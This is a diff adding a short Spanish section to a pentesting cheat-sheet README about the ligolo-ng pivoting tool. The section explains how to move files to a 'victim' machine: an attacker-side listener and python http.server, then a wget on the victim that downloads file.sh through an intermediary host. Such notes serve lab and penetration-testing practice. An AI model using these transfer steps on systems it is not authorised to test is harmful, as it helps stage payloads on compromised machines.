@@ -85,6 +85,21 @@ ligolo-ng » start  # TIENES QUE ESCRIBIR 'start'.
 
 <img src="https://raw.githubusercontent.com/DavidGrandeWeb/CyberTOOLS/main/Windows/IMG/Ligolo-session.png" width="60%" height="60%"><br>
 
+#### Transferir archivos a la víctima
+(Consola atacante) -> Puerto 1235 donde la víctima recibe y Puerto 8000 donde nosotros compartimos archivos
+```
+ligolo-ng » listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
+```
+```
+shell-atacante> python3 -m http.server 8000
+```
+
+(Consola víctima) -> Utilizar IP del intermediario.
+```
+shell-victima> wget http://20.20.20.2:1235/file.sh
+```
+
+
 ## 🔗 Links
 [![portfolio](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://davidgrandeweb.com/)
 [![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/david-grande-garc%C3%ADa-4586b1255/)
